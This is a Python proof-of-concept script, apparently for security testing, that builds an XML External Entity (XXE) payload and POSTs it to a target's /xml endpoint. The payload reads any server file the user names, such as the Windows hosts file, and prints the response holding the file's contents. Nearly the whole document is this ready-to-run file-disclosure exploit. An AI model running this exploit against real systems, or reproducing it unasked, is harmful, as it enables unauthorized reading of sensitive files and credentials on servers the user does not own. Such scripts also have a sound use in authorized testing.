import requests
import sys


def main():
    # Check if both arguments are provided
    if len(sys.argv) != 3:
        print("Usage: python xxe_poc.py <target_url> <file_path>")
        print("Example: python xxe_poc.py http://localhost:8080 C:\\Windows\\System32\\drivers\\etc\\hosts")
        sys.exit(1)
    
    target_url = sys.argv[1].rstrip('/')
    file_path = sys.argv[2]
    
    print(f"Target: {target_url}")
    print(f"File to read: {file_path}")
    print()
    
    # Test server connectivity
    try:
        response = requests.get(target_url, timeout=5)
        print(f"Server is accessible (Status: {response.status_code})")
    except requests.exceptions.RequestException as e:
        print(f"Cannot connect to server: {e}")
        sys.exit(1)
    
    # Create XXE payload to read the specified file
    # Convert Windows path format for file URI
    if file_path.startswith("C:") or file_path.startswith("c:"):
        file_uri = f"file:///{file_path}"
    else:
        file_uri = f"file://{file_path}"
    
    xxe_payload = f'''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE UserData [
<!ELEMENT UserData ANY>
<!ELEMENT name ANY>
<!ELEMENT email ANY>
<!ENTITY xxe SYSTEM "{file_uri}">
]>
<UserData>
    <name>&xxe;</name>
    <email>test@example.com</email>
</UserData>'''
    
    print("Sending XXE payload to /xml endpoint...")
    print()
    
    # Send XXE payload
    try:
        headers = {
            'Content-Type': 'application/xml'
        }
        
        response = requests.post(
            f"{target_url}/xml", 
            data=xxe_payload, 
            headers=headers, 
            timeout=10
        )
        
        print(f"Response Status: {response.status_code}")
        print(f"Response Body:")
        print("-" * 40)
        print(response.text)
        print("-" * 40)
        print()
    except requests.exceptions.RequestException as e:
        print(f"Request failed: {e}")
        sys.exit(1)


if __name__ == "__main__":
    main()
